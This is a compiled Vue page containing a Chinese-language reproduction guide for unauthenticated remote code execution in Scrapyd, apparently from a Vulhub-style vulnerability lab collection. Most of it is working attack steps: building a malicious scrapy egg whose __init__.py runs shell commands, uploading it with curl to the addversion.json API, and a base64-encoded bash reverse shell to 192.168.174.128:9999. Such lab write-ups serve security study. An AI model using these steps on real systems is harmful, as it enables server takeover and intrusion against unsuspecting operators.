import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as l,c,a as e,b as a,d as s,e as i}from"./app-58e4a7d6.js";const r={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"scrapyd是爬虫框架scrapy提供的云服务，用户可以部署自己的scrapy包到云服务，默认监听在6800端口。如果攻击者能访问该端口，将可以部署恶意代码到服务器，进而获取服务器权限。",-1),u=e("p",null,"参考链接：",-1),v={href:"https://www.leavesongs.com/PENETRATION/attack-scrapy.html",target:"_blank",rel:"noopener noreferrer"},g=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动scrapyd服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:6800</code>即可看到Web界面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282239821.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),m={href:"https://www.leavesongs.com/PENETRATION/attack-scrapy.html",target:"_blank",rel:"noopener noreferrer"},h=i(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ pip install scrapy scrapyd-client
$ scrapy startproject evil
$ cd evil
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>编辑 <code>evil/__init__.py</code>, 加入恶意代码：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> os

os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&#39;touch awesome_poc&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>进行部署：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ scrapyd-deploy --build-egg=evil.egg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>向API接口发送恶意包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功执行命令<code>touch awesome_poc</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282254990.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>同样的方法实现反弹shell，编辑 <code>evil/__init__.py</code>, 加入恶意代码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1

# base64编码（必须要base64编码，直接bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1是不行的）
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> os

os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo= | base64 -d | bash&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>进行部署：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ scrapyd-deploy --build-egg=evil.egg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>向API接口发送恶意包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282307169.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18);function b(x,_){const n=d("ExternalLinkIcon");return l(),c("div",null,[o,p,u,e("ul",null,[e("li",null,[e("a",v,[a("https://www.leavesongs.com/PENETRATION/attack-scrapy.html"),s(n)])])]),g,e("p",null,[a("参考"),e("a",m,[a("攻击Scrapyd爬虫"),s(n)]),a("，构造一个恶意的scrapy包：")]),h])}const f=t(r,[["render",b],["__file","Scrapyd 未授权访问漏洞.html.vue"]]);export{f as default};
